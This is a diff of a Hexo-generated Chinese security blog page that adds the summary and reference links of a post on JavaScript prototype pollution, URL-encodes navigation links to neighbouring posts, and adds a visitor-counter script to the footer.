-<p> <a href="https://nikoeurus.github.io/2019/11/30/JavaScript原型链污染/" target="_blank" rel="noopener">https://nikoeurus.github.io/2019/11/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a> </p>
+<h4><span id="总结">总结</span></h4><p>简单学习了JavaScript原型链污染的原理以及两道简单的题，下一步学习可以是一些源码更加复杂，或者与其他漏洞结合利用。</p>
+<h4><span id="参考链接">参考链接：</span></h4><p> <a href="https://www.anquanke.com/post/id/176884" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176884</a> </p>
+<p> <a href="https://nikoeurus.github.io/2019/11/30/JavaScript原型链污染/" target="_blank" rel="noopener">https://nikoeurus.github.io/2019/11/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a></p>
 
             </div>
           
@@ -292,14 +308,14 @@
         
   <nav class="post-nav">
     
-      <a class="prev" href="/2020/02/26/从一道题学习bypass-disable-func/">
+      <a class="prev" href="/2020/02/26/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0bypass-disable-func/">
         <i class="iconfont icon-left"></i>
         <span class="prev-text nav-default">从一道题学习bypass disable_func</span>
         <span class="prev-text nav-mobile">Prev</span>
       </a>
     
     
-      <a class="next" href="/2020/02/24/flask模版注入/">
+      <a class="next" href="/2020/02/24/flask%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/">
         <span class="next-text nav-default">flask模版注入</span>
         <span class="prev-text nav-mobile">Next</span>
         <i class="iconfont icon-right"></i>
@@ -323,16 +339,22 @@
 
       </div>
 
-      <footer id="colophon"><span class="copyright-year">
+      <footer id="colophon"><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span class="copyright-year">
     
         &copy;
     
     2020
     <span class="footer-author">glotozz.</span>
     <span class="power-by">
-        Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear">Polar Bear</a>
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
     </span>
 </span>
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访问量:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
 
       </footer>
 
